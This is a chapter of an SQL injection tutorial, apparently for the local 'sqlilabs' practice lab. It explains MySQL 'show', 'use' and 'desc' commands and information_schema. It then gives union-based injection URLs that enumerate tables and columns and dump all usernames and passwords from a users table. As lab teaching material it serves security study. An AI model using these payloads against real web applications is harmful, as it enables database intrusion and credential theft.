# Chapter 3

## Some useful SQL Commands

This section contains some SQL commands that can be used to get information about the current database. 

Here is a list of those commands - 

1.  ```show commands```

    These are a set of commands which provide information about databases, tables, columns, or status information about the commands.

    Some of them have been shown below - 

    1.  ```show tables```   
        
        Displays the tables present in a database.

    1.  ```show databases```

        Displays all the databases.

1.  ```use```

    This command is used to switch between databases.

1.  ```desc```

    ```desc``` is a short form for description. This command tells the user about all the columns present in the table.

## Extracting useful information from a query

Before we go further, we need to have a look at what ```information_schema``` is in ```MySql```.

> INFORMATION_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges. Other terms that are sometimes used for this information are data dictionary and system catalog.

### Getting the list of tables inside the database

In this section we'll try to get information from the mysql database by making use of ```information_schema```.

This is in continuation from the previous section. Again, we try to exploit the url given in the 4th lesson.

Once we know that the columns of a database is being used in the web page, we can exploit. 

We first try to get the list of tables from the database.

This can be done by accessing the ```TABLES``` table of ```information_schema``` which contains the list of all the tables in a database.

We already know the name of the ```MySql database``` from the previous section.  

Therefore the url will look somewhat like this - 

```http://localhost/sqlilabs/Less-4/?id=1") and 0 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database() --+```

On executing the above url, we will get the list of tables present inside the database.

:exclamation: The group_concat() in MySQL is used to concatenate data from multiple rows into one field.

### Getting the columns present inside a table

Once we know, the list of tables present inside the database we can now try to get the column name for the table that we are interested in. 

In the case of lesson-4, this will be the ```users``` table. We will try to get the column names for the ```users``` table.

The url for this will look somewhat like this - 

```
http://localhost/sqlilabs/Less-4/?id=1") and 0 union select 1,2, group_concat(column_name) from information_schema.columns where table_name="users" --+
```

The above url will return all the columns present inside the ```users``` table.

In the above url, we made use of the ```columns``` table and the ```column_name``` column.

### Getting the important stuff

After we know both the table names and columns we can get all the information present inside the table. 

This is how we can get all the usernames and passwords from the information that we acquired from the above steps.

The url in the end will look somewhat like this - 

```
http://localhost/sqlilabs/Less-4/?id=1") and 0 union select 1,group_concat(username), group_concat(password) from users --+
```

## Useful resources 

1.  https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
1.  https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/

:warning: This completes the basics for error-based sqli.